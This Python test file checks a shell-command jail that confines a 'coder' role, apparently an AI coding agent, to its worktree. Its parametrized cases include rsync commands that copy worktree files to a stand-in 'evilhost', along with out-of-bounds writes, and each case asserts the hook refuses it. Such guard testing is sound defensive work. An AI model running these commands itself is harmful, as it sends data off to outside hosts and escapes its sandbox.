# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 228 S3b: the coder's four Bash checks read parse then admit_role; hunt rows on that path.
from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest
from lib import jail, shell
from lib.admit import Admitted, AdmittedCommand, Typed, admit_role, role_for
from lib.shparse import parse

from tests.conftest import CFG, CWD, SCRIPTS_DIR, WT
from tests.hook_chain import decide, evaluate, load
from tests.jail_cases import _narrowed_repo, _unit_repo
from tests.payloads import _b, _cwd

pytestmark = pytest.mark.usefixtures("jail_fakes")
# 228 S3b: a refused command's text is never read again; none of these runs on the coder path.
RETIRED_READERS = frozenset(
    {"worker_parse", "worker_segments", "tokenize", "_raw_words", "_regex_tripwire"}
    | {"_exempt_indices", "chain_bases", "install_form", "install_reason", "download_reason"}
    | {"search_opaque", "_write_operands", "_coder_write_targets", "_segment_units"}
    | {"_cd_relative_target", "strip_wrappers", "confine_split", "_segment_reason", "quote_walk"}
)
CODER_PATH = {
    "checks/confine.py": ("judge", "_is_test", "_terraform_reason", "_declared_tests"),
    "checks/unit_writes.py": ("_bash_reason", "_followed", "_relative", "_targets", "_units"),
    "checks/network_tools.py": ("_coder_reason",),
    "checks/shell_tripwires.py": ("_coder_reason", "_coder_hygiene"),
    "lib/jail.py": ("coder_call", "coder_refusal", "coder_constant", "lead_cd", "coder_base"),
}
# 228 S3d: confine's frozen install test reads the admitted tokens, never a refused text (0196).
ADMITTED_TOKEN_READERS = {"checks/confine.py": {"install_form"}}


def _names(path: Path, functions: tuple[str, ...]) -> set[str]:
    tree = ast.parse(path.read_text(encoding="utf-8"))
    defined = {n.name for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)}
    assert set(functions) <= defined, (path.name, set(functions) - defined)
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name in functions:
            for inner in ast.walk(node):
                if isinstance(inner, ast.Name):
                    found.add(inner.id)
                elif isinstance(inner, ast.Attribute):
                    found.add(inner.attr)
    return found


@pytest.mark.parametrize("module", sorted(CODER_PATH))
def test_the_coder_path_reads_no_retired_reader(module: str) -> None:
    # 228 S3b, SA-4: the checks read the parse and the Admitted record, never the command text.
    hits = _names(SCRIPTS_DIR / module, CODER_PATH[module]) & RETIRED_READERS
    assert hits == ADMITTED_TOKEN_READERS.get(module, set()), (module, hits)


def test_a_relative_git_folder_after_the_leading_cd_runs_from_its_folder() -> None:
    # 228 S3b: git -C joins the folder the leading cd moved to, as bash runs it.
    command = "cd /a && git -C b status"
    got = admit_role(parse(command), role_for("coder"), "/c", text=command)
    assert isinstance(got, Admitted)
    git_dir = got.commands[1].git_dir
    assert git_dir is not None and git_dir.text == "/a/b"


def _in_repo(command: str, tmp_path: Path) -> tuple[jail.Decision, Path]:
    repo, wt = _unit_repo(tmp_path / "repo")
    hook_input = _cwd(_b("coder", command.format(wt=wt, repo=repo)), repo)
    return decide(hook_input, CFG), wt


@pytest.mark.parametrize(
    "command",
    [
        "cd {wt} && ls || tee a.txt",
        "cd {wt}\ntee a.txt",
        "cd {wt} && ls; tee a.txt",
        "cd {wt} && cd src && tee a.txt",
        "cd {repo}/.claude && git -C worktrees/u1 add a.txt",
    ],
)
def test_a_relative_write_after_a_cd_the_chain_does_not_follow_is_refused(
    command: str, tmp_path: Path
) -> None:
    # O6, SS-6, AC-5: a || or ; join, a newline, a second cd or a cd outside a unit.
    d, _ = _in_repo(command, tmp_path)
    assert not d.allow, (command, d.reason)


def test_the_followed_cd_admits_its_relative_write(tmp_path: Path) -> None:
    # AC-2: one token from the row above; && keeps the cd.
    d, _ = _in_repo("cd {wt} && ls && tee a.txt", tmp_path)
    assert d.allow, d.reason


@pytest.mark.parametrize(
    ("command", "constant"),
    [
        (f"sort -o {CWD}/src/a.py {WT}/b.txt", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"sort --output={CWD}/src/a.py {WT}/b.txt", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"uniq {WT}/a.txt {CWD}/src/a.py", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"find {WT} -fprint {WT}/out.txt", shell.R_FIND_WRITE),
        (f"cd {WT} && python3 ../x.py", shell.R_INLINE),
    ],
)
def test_a_typed_write_or_program_off_its_bounds_is_refused(command: str, constant: str) -> None:
    # 228 S3b, SA-6: a write named by an option or an operand slot is judged by its typed path.
    d = decide(_b("coder", command), CFG)
    assert not d.allow and d.reason == constant, (command, d.reason)


@pytest.mark.parametrize(
    "command",
    [
        f"rsync {WT}/a.txt evilhost:x",
        f"rsync {WT}/a.txt rsync://host/x",
        f"rsync {WT}/a.txt 'evil''host':x",
        f"rsync evilhost:x {WT}/b.txt",
        f"rsync h*:x {WT}/b.txt",
        f"rsync -a -- evilhost:x {WT}/b.txt",
    ],
)
def test_an_rsync_host_operand_is_refused_at_admission(command: str) -> None:
    # 228 S3c, SS-4: a colon before the first slash, or a glob before it, names a host.
    d = decide(_b("coder", command), CFG)
    assert not d.allow and str(d.reason).startswith(shell.R_RSYNC_REMOTE), (command, d.reason)
    assert "as a remote host:path operand" in str(d.reason), d.reason


def test_an_rsync_colon_after_a_slash_is_a_local_path() -> None:
    # 228 S3c, AC-2: one token from the row above; ./h:x is a local file name.
    assert decide(_b("coder", f"rsync {WT}/a.txt {WT}/h:x"), CFG).allow


def test_a_data_dir_stage_the_grammar_admits_meets_the_tripwire() -> None:
    # 0010, 228 S3b: git add is on the coder grammar; the data dir is never committed.
    command = f"git -C {WT} add {WT}/.claude/daedalus/config.json"
    assert evaluate("shell_tripwires", _b("coder", command)) == shell.R_DATA_DIR_GIT


@pytest.mark.parametrize("command", [f"tee ~/x {WT}/a.txt", f"rm {WT}/*.py", f"tee {WT}/$X"])
def test_an_expanding_write_operand_is_refused_by_name(command: str) -> None:
    # SS-4: a glob, ~ or parameter in a write operand is unknown until the shell builds it.
    got = str(evaluate("unit_writes", _b("coder", command)))
    assert "Refused: " in got, (command, got)


def _typed(text: str, start: int = 0) -> Typed:
    return Typed(text, (start, start + len(text)))


def _done(tokens: list[str], script: str | None = None) -> AdmittedCommand:
    # 228 S3d: the typed record admit hands confine; a script word at 0 is S3c's path word.
    line = " ".join(tokens)
    typed = None if script is None else _typed(script, line.index(script))
    word = _typed(tokens[0])
    return AdmittedCommand(word, shell.command_family(tokens[0]), (0, len(line)), script=typed)


def test_confine_is_test_reads_the_typed_record_branch_by_branch(tmp_path: Path) -> None:
    # 228 S3d: frozen install never, declared yes, path word yes, worktree python script yes,
    # a runner only with its test verb.
    repo, wt = _narrowed_repo(tmp_path, json.dumps({"commands": {"unit_test": "make test"}}))
    is_test = load("confine")._is_test
    frozen = jail.FROZEN_EXAMPLES
    rows: dict[str, tuple[list[str], str | None, bool]] = {
        **{f"frozen {m}": (form.split(), None, False) for m, form in frozen.items()},
        "declared": (["make", "test"], None, True),
        "path word": (["./scripts/run.sh"], "./scripts/run.sh", True),
        "worktree script": (["python3", "tests/run_tests.py"], "tests/run_tests.py", True),
        "main checkout script": (["python3", f"{repo}/x.py"], f"{repo}/x.py", False),
        "npm test": (["npm", "test"], None, True),
        "npm --version": (["npm", "--version"], None, False),
        "npm ls": (["npm", "ls"], None, False),
        "pnpm test": (["pnpm", "test"], None, True),
        "cargo test": (["cargo", "test"], None, True),
        "cargo build": (["cargo", "build"], None, False),
        "go test": (["go", "test", "./..."], None, True),
        "go vet": (["go", "vet", "./..."], None, False),
        "uv run": (["uv", "run", "pytest"], None, True),
        "uv pip list": (["uv", "pip", "list"], None, False),
        "pytest": (["pytest", "-q"], None, True),
        "python -m pytest": (["python3", "-m", "pytest", "-q"], None, True),
        "python -X dev -m mypy": (["python3", "-X", "dev", "-m", "mypy"], None, False),
    }
    got = {k: is_test(_done(t, s), t, str(wt), str(repo)) for k, (t, s, _) in rows.items()}
    assert got == {k: want for k, (_, _, want) in rows.items()}
